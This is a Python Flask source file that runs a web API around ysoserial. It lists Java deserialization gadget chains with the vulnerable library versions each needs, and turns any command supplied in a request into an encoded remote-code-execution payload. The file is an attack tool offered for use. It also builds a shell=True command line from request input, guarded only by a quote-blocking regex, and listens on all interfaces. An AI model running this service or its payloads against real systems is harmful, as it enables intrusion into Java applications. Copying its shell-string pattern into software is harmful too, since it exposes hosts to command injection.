from flask import Flask, request, jsonify
import re
import os
import subprocess

app = Flask(__name__)

# define vars
gadget_chains = {
    "gadget_chains": [
        "AspectJWeaver", "BeanShell1", "C3P0", "Click1", "Clojure", "CommonsBeanutils1",
        "CommonsCollections1", "CommonsCollections2", "CommonsCollections3", "CommonsCollections4",
        "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "FileUpload1",
        "Groovy1", "Hibernate1", "Hibernate2", "JBossInterceptors1", "JRMPClient", "JRMPListener",
        "JSON1", "JavassistWeld1", "Jdk7u21", "Jython1", "MozillaRhino1", "MozillaRhino2",
        "Myfaces1", "Myfaces2", "ROME", "Spring1", "Spring2", "URLDNS", "Vaadin1", "Wicket1"
    ]
}


dependency = {
 'AspectJWeaver': 'aspectjweaver:1.9.2, commons-collections:3.2.2',
 'BeanShell1': 'bsh:2.0b5',
 'C3P0': 'c3p0:0.9.5.2, mchange-commons-java:0.2.11',
 'Click1': 'click-nodeps:2.3.0, javax.servlet-api:3.1.0',
 'Clojure': 'clojure:1.8.0',
 'CommonsBeanutils1': 'commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2',
 'CommonsCollections1': 'commons-collections:3.1',
 'CommonsCollections2': 'commons-collections4:4.0',
 'CommonsCollections3': 'commons-collections:3.1',
 'CommonsCollections4': 'commons-collections4:4.0',
 'CommonsCollections5': 'commons-collections:3.1',
 'CommonsCollections6': 'commons-collections:3.1',
 'CommonsCollections7': 'commons-collections:3.1',
 'FileUpload1': 'commons-fileupload:1.3.1, commons-io:2.4',
 'Groovy1': 'groovy:2.3.9',
 'Hibernate1': 'N/A',
 'Hibernate2': 'N/A',
 'JBossInterceptors1': 'javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21',
 'JRMPClient': 'N/A',
 'JRMPListener': 'N/A',
 'JSON1': 'json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1',
 'JavassistWeld1': 'javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21',
 'Jdk7u21': 'N/A',
 'Jython1': 'jython-standalone:2.5.2',
 'MozillaRhino1': 'js:1.7R2',
 'MozillaRhino2': 'js:1.7R2',
 'Myfaces1': 'N/A',
 'Myfaces2': 'N/A',
 'ROME': 'rome:1.0',
 'Spring1': 'spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE',
 'Spring2': 'spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2',
 'URLDNS': 'N/A',
 'Vaadin1': 'vaadin-server:7.7.14, vaadin-shared:7.7.14',
 'Wicket1': 'wicket-util:6.23.0, slf4j-api:1.6.4'
}

encoder = ['base64', 'xxd']

# to sanitize the command
chars = r"[\'\"]"

# service port
PORT = 22222

@app.route('/yso/chains', methods=['GET'])
def get_chains():
    return jsonify(gadget_chains)

@app.route('/yso/deps', methods=['GET'])
def get_dependency():
    chain = request.args.get('chain')
    if chain in dependency:
        return jsonify({chain: dependency[chain]})
    else:
        return jsonify({"error": "unknown_chain"}), 404

@app.route('/yso/payload', methods=['GET'])
def generate_payload():
    chain = request.args.get('chain')
    cmd = request.args.get('cmd')
    encode = request.args.get('encode')

    # check chain
    if chain not in gadget_chains["gadget_chains"]:
        return jsonify({"error": "unknown_chain"}), 400

    # check cmd
    if re.search(chars, cmd):
        return jsonify({"error": "disabled_command"}), 400

    # check encode
    if encode not in encoder:
        return jsonify({"error": "unknown_encoder"}), 400
    if encode == 'base64':
        if os.uname().sysname == 'Linux':
            encode_command = 'base64 -w 0'
        else:
            encode_command = encode
    else:
        encode_command = encode

    # payload generating
    command = f"/Users/chris/Library/Java/JavaVirtualMachines/corretto-1.8.0_392/Contents/Home/bin/java -jar ysoserial-all.jar {chain} '{cmd}' | {encode_command}"
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return jsonify({"payload": result.decode('utf-8').strip()})
    except subprocess.CalledProcessError as e:
        return jsonify({"error": "command_execution_failed", "details": e.output.decode('utf-8')}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT)
